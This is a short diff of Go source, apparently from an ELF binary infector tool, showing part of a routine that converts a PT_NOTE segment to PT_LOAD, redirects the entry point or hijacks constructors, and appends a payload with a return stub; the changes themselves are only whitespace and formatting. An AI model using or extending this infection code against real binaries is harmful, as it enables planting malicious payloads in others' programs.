@@ -37,7 +37,7 @@ func (t *TargetBin) PtNoteToPtLoadInfection(opts InfectOpts) error {
 		t.Phdrs.([]elf.Prog64)[noteNdx].Off = uint64(t.Filesz)
 
 		t.printDebugMsg("[+] Newly created PT_LOAD virtual address starts at 0x%x\n", t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr)
-		
+
 		newEntry := t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr
 
 		var origAddend int64
@@ -46,27 +46,27 @@ func (t *TargetBin) PtNoteToPtLoadInfection(opts InfectOpts) error {
 			if err := t.relativeRelocHook(&origAddend, &relocEntry, int64(newEntry)); err != nil {
 				return err
 			}
-			
-		}else {
-			t.Hdr.(*elf.Header64).Entry = newEntry 
+
+		} else {
+			t.Hdr.(*elf.Header64).Entry = newEntry
 		}
-		
+
 		t.printDebugMsg("[+] Modifed entry point from 0x%x to 0x%x\n", oEntry, t.Hdr.(*elf.Header64).Entry)
 
 		if !((opts & NoRest) == NoRest) {
 			t.Payload.Write(restoration64)
 		}
-		
+
 		if !((opts & NoRetOEP) == NoRetOEP) {
 			var retStub []byte
 			if (opts & CtorsHijack) == CtorsHijack {
-				retStub = modEpilogue(int32(t.Payload.Len() + 5), uint64(relocEntry.Addend), uint64(origAddend))
-			}else {
-				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry)
+				retStub = modEpilogue(int32(t.Payload.Len()+5), uint64(relocEntry.Addend), uint64(origAddend))
+			} else {
+				retStub = modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
 			}
 			t.Payload.Write(retStub)
 		}
-		
+
 		plen := uint64(t.Payload.Len())
 
 		t.Phdrs.([]elf.Prog64)[noteNdx].Filesz += plen
